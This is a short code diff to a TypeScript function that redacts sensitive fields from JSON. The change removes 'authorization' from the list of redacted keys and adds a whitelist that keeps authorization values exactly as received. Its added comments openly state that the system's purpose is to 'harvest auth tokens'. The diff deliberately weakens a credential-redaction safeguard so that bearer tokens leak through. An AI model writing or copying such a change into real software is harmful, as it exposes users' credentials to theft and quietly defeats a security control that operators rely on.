@@ -167,15 +167,20 @@ export function createEndpointSummary(
 
 /**
  * Redact sensitive fields from JSON objects
+ * 
+ * CRITICAL: 'authorization' keys are whitelisted and preserved.
+ * The core purpose of this system is to harvest auth tokens.
  */
 function redactSensitiveFields(obj: any): any {
+  // WHITELIST: Never redact 'authorization' - it's critical for token harvesting
+  const AUTHORIZATION_WHITELIST = new Set(['authorization']);
+  
   const SENSITIVE_KEYS = new Set([
     'password',
     'token',
     'secret',
     'api_key',
     'apikey',
-    'authorization',
     'auth',
     'cookie',
     'session',
@@ -190,7 +195,11 @@ function redactSensitiveFields(obj: any): any {
     const redacted: any = {};
     for (const [key, value] of Object.entries(obj)) {
       const lowerKey = key.toLowerCase();
-      if (SENSITIVE_KEYS.has(lowerKey) || lowerKey.includes('password') || lowerKey.includes('token')) {
+      
+      // WHITELIST: Preserve authorization keys exactly as received
+      if (AUTHORIZATION_WHITELIST.has(lowerKey)) {
+        redacted[key] = value; // Preserve exactly as received
+      } else if (SENSITIVE_KEYS.has(lowerKey) || lowerKey.includes('password') || lowerKey.includes('token')) {
         redacted[key] = '[REDACTED]';
       } else {
         redacted[key] = redactSensitiveFields(value);
